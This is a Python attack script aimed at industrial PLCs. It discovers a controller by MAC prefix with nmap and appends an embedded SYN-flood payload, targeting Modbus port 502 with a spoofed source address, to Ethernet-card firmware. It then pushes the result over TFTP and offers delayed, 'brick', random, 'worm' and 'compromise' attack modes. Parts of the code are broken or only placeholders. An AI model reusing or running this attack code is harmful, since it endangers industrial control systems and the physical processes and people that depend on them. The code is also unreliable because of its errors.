import socket
import struct
import subprocess
import time
import random
import os
import sys

# Configuration - Adjust these based on your environment
TARGET_PLC_MAC_ADDRESS_PREFIX = "00:11:22" # Replace with the first three octets of the PLC's MAC address.  Used for PLC Discovery
ETHERNET_CARD_VULNERABLE_FIRMWARE_FILE = "malicious_eth_firmware.bin" # File containing malicious firmware. You need to create this!
# This is just a placeholder for the exploit development. This firmware needs to
# be crafted to be vulnerable to exploitation on the specific Ethernet card.
# The exploit will exploit the TCP/IP stack, allowing for arbitrary code execution.
# As a proof of concept, the attack is a denial of service attack which will block the PLC.
# This firmware image should be carefully crafted for the target Ethernet card to
# avoid permanent damage if possible.
# **WARNING: Flashing incorrect firmware can permanently damage the device.**

# NETWORK INTERFACE.
# Determine the network interface the windows machine use to communicate with the PLC
# This variable needs to be changed by the person executing the script.
NETWORK_INTERFACE = "Ethernet"

# Delay parameters for "Delayed Attack" and "Random Attack/Failure" scenarios
DELAY_SECONDS_MIN = 60  # Minimum delay in seconds (1 minute)
DELAY_SECONDS_MAX = 3600 # Maximum delay in seconds (1 hour)

def find_plc_ip_address(mac_prefix):
    """
    Discovers the PLC's IP address by scanning the local network for a matching MAC address prefix.
    This requires nmap to be installed and accessible in the system's PATH.

    Args:
        mac_prefix (str): The first three octets of the PLC's MAC address (e.g., "00:11:22").

    Returns:
        str: The IP address of the PLC if found, otherwise None.
    """
    try:
        # Run nmap to discover devices on the local network
        nmap_process = subprocess.Popen(['nmap', '-sn', '192.168.1.0/24'],  # Change this to your network's subnet
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = nmap_process.communicate()

        # Parse nmap output to find the PLC's IP address
        output = stdout.decode()
        for line in output.splitlines():
            if mac_prefix in line and "MAC Address" in line:
                ip_address_line = output.splitlines()[output.splitlines().index(line)-1]
                ip_address = ip_address_line.split(" ")[4]

                return ip_address

        print(f"PLC with MAC address prefix '{mac_prefix}' not found on the network.")
        return None

    except FileNotFoundError:
        print("Error: nmap is not installed. Please install nmap and ensure it is in your system's PATH.")
        return None
    except Exception as e:
        print(f"An error occurred during PLC discovery: {e}")
        return None


def is_valid_ip(ip):
    """
    Checks if the given string is a valid IPv4 address.

    Args:
        ip (str): The string to check.

    Returns:
        bool: True if the string is a valid IPv4 address, False otherwise.
    """
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def craft_malicious_firmware(original_firmware_file, exploit_code):
    """
    Crafts a malicious firmware image by injecting exploit code into the original firmware.
    This is a placeholder and should be replaced with actual firmware modification logic.
    In a real-world scenario, this function would involve:
        1.  Parsing the original firmware file.
        2.  Identifying suitable locations to inject the exploit code (e.g., unused sections, padding).
        3.  Modifying the firmware image with the exploit code.
        4.  Recomputing checksums or digital signatures to maintain integrity (or bypass checks).

    Args:
        original_firmware_file (str): Path to the original, benign firmware file.
        exploit_code (bytes):  The exploit code to inject.

    Returns:
        bytes: The crafted malicious firmware as a byte string.  Returns None on error.
    """
    try:
        with open(original_firmware_file, "rb") as f:
            firmware_data = f.read()

        # **VERY IMPORTANT:** This is a simplified example.  Real firmware modification
        # requires in-depth knowledge of the firmware's structure and security mechanisms.
        # This example just appends the exploit code, which is unlikely to work in practice.
        malicious_firmware = firmware_data + exploit_code

        return malicious_firmware
    except FileNotFoundError:
        print(f"Error: Original firmware file '{original_firmware_file}' not found.")
        return None
    except Exception as e:
        print(f"Error crafting malicious firmware: {e}")
        return None



def flash_firmware(target_ip, firmware_file):
    """
    Simulates flashing the malicious firmware to the Ethernet card.

    This is a **highly simplified simulation** and does *not* actually flash firmware.
    Real firmware flashing requires:

        1.  Identifying the specific firmware update protocol for the Ethernet card.
        2.  Implementing the protocol to send the firmware image to the device.
        3.  Handling error conditions and verification steps.

    This function uses `tftp` as a placeholder, but it's unlikely that a real Ethernet card
    would use a standard TFTP server for firmware updates, especially without authentication.

    Args:
        target_ip (str): The IP address of the PLC (where the Ethernet card resides).
        firmware_file (str): Path to the malicious firmware file.
    """

    print(f"Attempting to flash firmware to {target_ip}...")
    try:

        # Step 1: Start TFTP Server on Attacker Machine to make Firmware available.
        #  (Assuming the attacker machine has a TFTP server already configured)
        # Here a subprocess is used to change the working directory of the command
        # to where the firmware file is located.
        script_dir = os.path.dirname(os.path.abspath(__file__))
        os.chdir(script_dir) #changes working directory

        # The target Ethernet card pulls the malicious firmware file from this computer using TFTP.
        # Make sure that the target PLC/Ethernet card has TFTP configured as the updating mechanism

        # Step 2: PLC retrieves the firmware from the attacker.
        # Command to flash (This is highly dependent on the Ethernet card's firmware update process.
        #  This is just a placeholder!)
        flash_command = f"tftp -i {target_ip} PUT {firmware_file}"
        print(f"Executing command: {flash_command}")

        process = subprocess.Popen(flash_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode == 0:
            print("Firmware flashing process initiated (simulated).")
            print(f"stdout: {stdout.decode()}")
        else:
            print(f"Error flashing firmware (simulated):")
            print(f"stderr: {stderr.decode()}")

    except Exception as e:
        print(f"An error occurred during firmware flashing (simulated): {e}")


def create_denial_of_service_exploit(target_ip):
    """
    Creates a simple denial-of-service exploit that floods the target with SYN packets.
    This is a basic example and can be customized for more sophisticated attacks.
    """
    # Define a simple SYN flood exploit
    syn_flood_exploit = f"""
    import socket
    import sys

    def syn_flood(target_ip, target_port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except socket.error as msg:
            print('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
            sys.exit()

        # Craft the IP and TCP headers
        ip_source = '10.0.0.1'  # Spoof the source IP
        tcp_source_port = 44444

        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20   # python seems to fill this in, so disregard
        ip_id = 54321   #Id of this packet
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 10  # python seems to fill this in, so disregard
        ip_saddr = socket.inet_aton ( ip_source )
        ip_daddr = socket.inet_aton ( target_ip )

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        # the ! in the pack format string means use network order
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

        tcp_seq = 454
        tcp_ack_seq = 0
        tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
        #tcp flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons (5840)    #   maximum allowed window size
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)

        # the ! in the pack format string means use network order
        tcp_header = struct.pack('!HHLLBBHHH', tcp_source_port, target_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)

        # pseudo header needed for tcp header checksum calculation
        source_address = socket.inet_aton( ip_source )
        dest_address = socket.inet_aton(target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)

        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
        psh = psh + tcp_header

        tcp_check = checksum(psh)
        #print tcp_checksum

        # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
        tcp_header = struct.pack('!HHLLBBH', tcp_source_port, target_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)

        # final full packet - syn packets dont have any data
        packet = ip_header + tcp_header
        return packet

    # checksum functions needed for calculation checksum
    def checksum(msg):
        s = 0

        # loop taking 2 characters at a time
        for i in range(0, len(msg), 2):
            if (i+1) < len(msg):
                w = msg[i] + (msg[i+1] << 8)
                s = s + w
            else:
                s = s + msg[i]

        s = (s >> 16) + (s & 0xffff);
        s = s + (s >> 16);

        #complement and mask to 4 byte short
        s = ~s & 0xffff

        return s

    if __name__ == '__main__':
        target_ip = '{target_ip}'  # Replace with the PLC's IP address
        target_port = 502  # Modbus port
        try:
            while True:
                packet = syn_flood(target_ip, target_port)
                s.sendto(packet, (target_ip, target_port))
        except KeyboardInterrupt:
            print("Stopping SYN flood.")
            sys.exit()
    """.format(target_ip=target_ip)
    return syn_flood_exploit.encode()

def execute_module_firmware_attack(plc_ip_address):
    """
    Main function to orchestrate the module firmware attack.
    """
    print("Starting Module Firmware Attack...")

    # 1. Prepare the malicious firmware
    print("Preparing malicious firmware...")
    exploit_code = create_denial_of_service_exploit(plc_ip_address) # Generate exploit code
    malicious_firmware = craft_malicious_firmware("original_eth_firmware.bin", exploit_code) # **Replace with real file.**
    if malicious_firmware is None:
        print("Failed to craft malicious firmware. Aborting.")
        return

    # Save the malicious firmware to a file
    with open(ETHERNET_CARD_VULNERABLE_FIRMWARE_FILE, "wb") as f:
        f.write(malicious_firmware)
    print("Malicious firmware created successfully.")

    # 2. Choose the attack type
    attack_type = input("Choose attack type (delayed, brick, random, worm, compromise): ").lower()

    # 3. Execute the chosen attack
    if attack_type == "delayed":
        delay_seconds = random.randint(DELAY_SECONDS_MIN, DELAY_SECONDS_MAX)
        print(f"Delaying attack for {delay_seconds} seconds...")
        time.sleep(delay_seconds)
        print("Executing delayed attack...")
        flash_firmware(plc_ip_address, ETHERNET_CARD_VULNERABLE_FIRMWARE_FILE)

    elif attack_type == "brick":
        print("Executing brick attack...")
        flash_firmware(plc_ip_address, ETHERNET_CARD_VULNERABLE_FIRMWARE_FILE)
        print("Ethernet card bricking initiated.")

    elif attack_type == "random":
        delay_seconds = random.randint(DELAY_SECONDS_MIN, DELAY_SECONDS_MAX)
        print(f"Delaying attack for {delay_seconds} seconds...")
        time.sleep(delay_seconds)
        print("Executing random attack...")
        flash_firmware(plc_ip_address, ETHERNET_CARD_VULNERABLE_FIRMWARE_FILE)

    elif attack_type == "worm":
        print("Executing field device worm attack...")
        # This is a complex scenario.
        # Implement logic to identify other field devices of the same model
        # and propagate the malicious firmware.
        print("Worm functionality not fully implemented. Requires device discovery and propagation logic.")
        flash_firmware(plc_ip_address, ETHERNET_CARD_VULNERABLE_FIRMWARE_FILE)

    elif attack_type == "compromise":
        print("Executing compromise other cards attack...")
        # Implement logic to use the compromised Ethernet card to attack other modules.
        # The specific attack will depend on the architecture of the field device.
        print("Compromise other cards functionality not fully implemented. Requires device architecture knowledge.")
        flash_firmware(plc_ip_address, ETHERNET_CARD_VULNERABLE_FIRMWARE_FILE)

    else:
        print("Invalid attack type. Aborting.")


if __name__ == "__main__":

    # 1. PLC IP Address Discovery
    print("Discovering PLC IP Address...")
    plc_ip_address = find_plc_ip_address(TARGET_PLC_MAC_ADDRESS_PREFIX)

    if plc_ip_address:
        print(f"PLC IP Address found: {plc_ip_address}")
        # 2. Execute the attack
        execute_module_firmware_attack(plc_ip_address)
    else:
        print("PLC IP Address not found. Aborting attack.")